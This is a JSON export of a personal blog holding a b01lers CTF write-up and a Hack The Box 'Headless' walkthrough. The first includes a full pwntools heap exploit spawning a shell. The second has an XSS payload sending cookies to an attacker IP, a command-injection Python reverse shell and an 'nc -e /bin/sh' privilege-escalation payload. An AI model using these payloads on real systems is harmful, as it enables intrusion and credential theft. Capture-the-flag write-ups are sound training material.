[{"content":"Reverse Annnnnnny-Second-Now The function super_optimized_calculation is a Fibonacci generator. To solve this chall, we just use the 90th Fibonacci number and modulo it by each number in the v6 array. Code:\nv6=[0]*25 v6[0] = 35831; v6[1] = 143; v6[2] = 1061; v6[3] = 877; v6[4] = 29463179; v6[5] = 229; v6[6] = 112; v6[7] = 337; v6[8] = 1061; v6[9] = 47; v6[10] = 29599; v6[11] = 145; v6[12] = 127; v6[13] = 271639; v6[14] = 127; v6[15] = 353; v6[16] = 193; v6[17] = 191; v6[18] = 337; v6[19] = 1061; v6[20] = 193; v6[21] = 353; v6[22] = 269; v6[23] = 487; v6[24] = 245; a = 2880067194370816120 \u0026amp; ((1\u0026lt;\u0026lt;64)-1) for i in v6: print(chr(a%i),end=\u0026#39;\u0026#39;) js-safe After deobfuscating the code, we can see that the function addToPassword use some operation to check the pass code. If true, it uses this pass code as a key to decrypt the AES encrypted flag.\nfunction addToPassword(_0x43b7e8) { if (_0x12b1c8.length \u0026lt; 0x6) { _0x12b1c8 += _0x43b7e8; _0x38a66f(); if (_0x12b1c8.length === 0x6) { let _0xf3bbf = Array(0x6); for (let _0x2c8c6a = 0x0; _0x2c8c6a \u0026lt; 0x6; _0x2c8c6a += 0x1) { _0xf3bbf[_0x2c8c6a] = _0x12b1c8[_0x2c8c6a].charCodeAt(0x0); } let _0x4cedc7 = true; _0x4cedc7 \u0026amp;= _0xf3bbf[0x4] == _0xf3bbf[0x1] - 0x4; _0x4cedc7 \u0026amp;= _0xf3bbf[0x1] == (_0xf3bbf[0x0] ^ 0x44); _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == _0xf3bbf[0x2] - 0x7; _0x4cedc7 \u0026amp;= _0xf3bbf[0x3] == (_0xf3bbf[0x2] ^ 0x25); _0x4cedc7 \u0026amp;= _0xf3bbf[0x5] == (_0xf3bbf[0x0] ^ 0x14); _0x4cedc7 \u0026amp;= _0xf3bbf[0x4] == _0xf3bbf[0x1] - 0x4; _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == (_0xf3bbf[0x3] ^ 0x22); _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == _0xf3bbf[0x2] - 0x7; _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == _0xf3bbf[0x5] + 0xc; _0x4cedc7 \u0026amp;= _0xf3bbf[0x2] == _0xf3bbf[0x4] + 0x47; _0x4cedc7 \u0026amp;= _0xf3bbf[0x2] == (_0xf3bbf[0x5] ^ 0x13); _0x4cedc7 \u0026amp;= _0xf3bbf[0x5] == (_0xf3bbf[0x3] ^ 0x36); _0x4cedc7 \u0026amp;= 0x52 == _0xf3bbf[0x3]; if (_0x4cedc7) { document.getElementById(\u0026#34;display\u0026#34;).classList.add(\u0026#34;correct\u0026#34;); let _0x401b01 = CryptoJS.AES.decrypt(\u0026#34;U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw\u0026#34;, _0x12b1c8).toString(CryptoJS.enc.Utf8); console.log(_0x401b01); document.getElementById(\u0026#34;display\u0026#34;).textContent = _0x401b01; } else { document.getElementById(\u0026#34;display\u0026#34;).classList.add(\u0026#34;wrong\u0026#34;); } } } } After calculating, we get the pass code is p4wR0d. Use this pass code to decrypt the flag.\nFlag: bctf{345y-p4s5w0rd-\u0026gt;w\u0026lt;}\nPwn shall-we-play-a-game Because we can input v7 with the length 86, we can overwrite the return address of the function main to the address of the function global_thermo_nuclear_war to get the flag.\neasy-note This challenge give us a menu which have 5 options: add, delete, view, edit and resize. The binary allow us to modify the content of note whatever it is free or not. To solve it, I use the UAF and tcache poisoning technique to get the shell.\nFirst, we will use double free to leak the address of heap.\nadd(0,0x80) # use for heap leak add(1,0x80) # use for libc leak add(2,0x80) # Prevent consolidation with top chunk # Use double free to leak heap address delete(0) delete(0) view(0) heap =u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x260 log.info(\u0026#39;[+] Heap base: \u0026#39;+hex(heap)) With heap base address, I can get chunk inside the tcache_perthread_struct by overwriting the fd of the chunk at index 0(now it is 0x80 tcache).\nedit(0,8,p64(heap+0x10)) Next, I allocate 2 chunks to get the chunk inside the tcache_perthread_struct. Then, I overwrite the size value of the 0x80 tcache bin, make it look like full.\nadd(3,0x80) add(4,0x80) edit(4,8,p64(0x0700000000000000)) Now, I free the chunk at index 1 to make it into the unsorted bin and leak the libc address.\ndelete(1) view(1) With libc address, I edit the first 0x80 tcache value is __free_hook and make the size value of 0x80 tcache bin is 0. Then, I allocate a 0x80 chunk to get the __free_hook address.\nedit(4,0x78+8,b\u0026#39;\\x00\u0026#39;*0x78+p64(libc.sym[\u0026#39;__free_hook\u0026#39;])) add(5,0x80) Finally, I overwrite the __free_hook with the address of system and get the shell.\nedit(5,8,p64(libc.sym[\u0026#39;system\u0026#39;])) edit(0,8,\u0026#39;/bin/sh\\x00\u0026#39;) delete(0) Full exploit from pwn import * exe = ELF(\u0026#34;./chal_patched\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) ld = ELF(\u0026#34;./ld-2.27.so\u0026#34;) p = process([exe.path]) def add(pos,size): p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) p.recvuntil(b\u0026#39;size?\u0026#39;) p.sendline(str(size).encode()) def delete(pos): p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) def view(pos): p.sendline(b\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) def edit(pos,size,mes): p.sendline(b\u0026#39;4\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) p.recvuntil(b\u0026#39;size?\u0026#39;) p.sendline(str(size).encode()) p.sendline(mes) def resize(pos,size): p.sendline(b\u0026#39;6\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) p.recvuntil(b\u0026#39;size?\u0026#39;) p.sendline(str(size).encode()) add(0,0x80) add(1,0x80) add(2,0x80) delete(0) delete(0) view(0) heap =u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x260 log.info(\u0026#39;[+] Heap base: \u0026#39;+hex(heap)) # tcache poisoning edit(0,8,p64(heap+0x10)) add(3,0x80) add(4,0x80) edit(4,8,p64(0x0700000000000000)) # Leak libc delete(1) view(1) libc.address = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3ebca0+0x3c000 log.info(\u0026#39;[+] Libc base: \u0026#39;+hex(libc.address)) log.info(\u0026#34;[+] Free hook address: \u0026#34;+hex(libc.sym[\u0026#39;__free_hook\u0026#39;])) edit(4,0x78+8,b\u0026#39;\\x00\u0026#39;*0x78+p64(libc.sym[\u0026#39;__free_hook\u0026#39;])) add(5,0x80) edit(5,8,p64(libc.sym[\u0026#39;system\u0026#39;])) edit(0,8,\u0026#39;/bin/sh\\x00\u0026#39;) delete(0) p.interactive() ","permalink":"//localhost:1313/posts/b01ler-wu/post/","summary":"Reverse Annnnnnny-Second-Now The function super_optimized_calculation is a Fibonacci generator. To solve this chall, we just use the 90th Fibonacci number and modulo it by each number in the v6 array. Code:\nv6=[0]*25 v6[0] = 35831; v6[1] = 143; v6[2] = 1061; v6[3] = 877; v6[4] = 29463179; v6[5] = 229; v6[6] = 112; v6[7] = 337; v6[8] = 1061; v6[9] = 47; v6[10] = 29599; v6[11] = 145; v6[12] = 127; v6[13] = 271639; v6[14] = 127; v6[15] = 353; v6[16] = 193; v6[17] = 191; v6[18] = 337; v6[19] = 1061; v6[20] = 193; v6[21] = 353; v6[22] = 269; v6[23] = 487; v6[24] = 245; a = 2880067194370816120 \u0026amp; ((1\u0026lt;\u0026lt;64)-1) for i in v6: print(chr(a%i),end=\u0026#39;\u0026#39;) js-safe After deobfuscating the code, we can see that the function addToPassword use some operation to check the pass code.","title":"BoilerCTF Write-up"},{"content":"User flag Recon Port scanning: Directory scanning:\nServer open a port (5000) for running a website. After scanning directories, I found 2 interesting directories :\n/support which we can access by For questions button. It has a form to submit a message. By checking its request, I find that it is using POST method to send data to the server. I try to send a message with a payload \u0026lt;h1\u0026gt;alert(1)\u0026lt;/h1\u0026gt; and it responses a alert form which includes header of this request. Additionally, I decode is_admin cookie and get a string which have first part is user and second part is a unreadable string. /dashoard which is only for authenticated account. Exploitation Notice that the form print the header of request, so I try to change the header User-Agent to XSS payload and it works.\nAfter that, I set up a listener and send a payload to get the cookie.\n\u0026lt;script\u0026gt;fetch(\u0026#34;http://10.10.14.65:9030/?cookie=\u0026#34;+document.cookie);\u0026lt;/script\u0026gt; I got the is_admin cookie. Replace the cookie with the one I got, I can access the dashboard page. Use Generate report button, the web will send a request with a parameter data equal the date we choose. I try to change it to a linux command and it works. Then, I use reverse shell payload to get shell.\n;export RHOST=\u0026#34;10.10.14.65\u0026#34;;export RPORT=9001;python3 -c \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39;; Get shell and user flag. Root flag Recon Run sudo -l command, I see that I can run sudo /usr/bin/syscheck as root without password. Command syscheck is looking for the initdb.sh program to execute. When syscheck is run as root, it will execute initdb.sh as root.\nExploitation Create a file initdb.sh with reverse shell payload and make it executable.\nnc -e \u0026#39;/bin/sh\u0026#39; 10.10.14.65 7878 Run syscheck and get root shell. ","permalink":"//localhost:1313/posts/headless-htb/post/","summary":"User flag Recon Port scanning: Directory scanning:\nServer open a port (5000) for running a website. After scanning directories, I found 2 interesting directories :\n/support which we can access by For questions button. It has a form to submit a message. By checking its request, I find that it is using POST method to send data to the server. I try to send a message with a payload \u0026lt;h1\u0026gt;alert(1)\u0026lt;/h1\u0026gt; and it responses a alert form which includes header of this request.","title":"Headless Hackthebox"},{"content":"Hi Nothing here\n","permalink":"//localhost:1313/posts/main/","summary":"Hi Nothing here","title":"This is my test blog post"}]